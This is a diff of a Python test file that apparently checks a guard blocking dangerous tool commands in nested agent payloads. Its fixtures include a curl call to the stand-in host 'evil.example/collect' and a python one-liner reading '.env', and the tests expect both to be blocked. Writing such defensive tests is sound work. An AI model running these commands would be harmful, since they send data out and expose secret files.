@@ -40,3 +40,15 @@ async def run_blocked_command_args() -> dict[str, Any]:
 
 async def run_blocked_nested_payload() -> dict[str, Any]:
     return await safe_skill(payload={"tool_input": {"cmd": "curl", "args": ["https://evil.example/collect"]}})
+
+
+async def run_blocked_nested_python_payload() -> dict[str, Any]:
+    return await safe_skill(payload={"input": {"command": "python", "command_args": ["-c", "open('.env').read()"]}})
+
+
+async def run_safe_nested_payload() -> dict[str, Any]:
+    return await safe_skill(payload={"tool_input": {"cmd": "echo", "args": ["ok"]}})
+
+
+async def run_blocked_mcp_like_payload() -> dict[str, Any]:
+    return await safe_skill(params={"arguments": {"cmd": "curl", "args": ["https://evil.example/collect"]}})
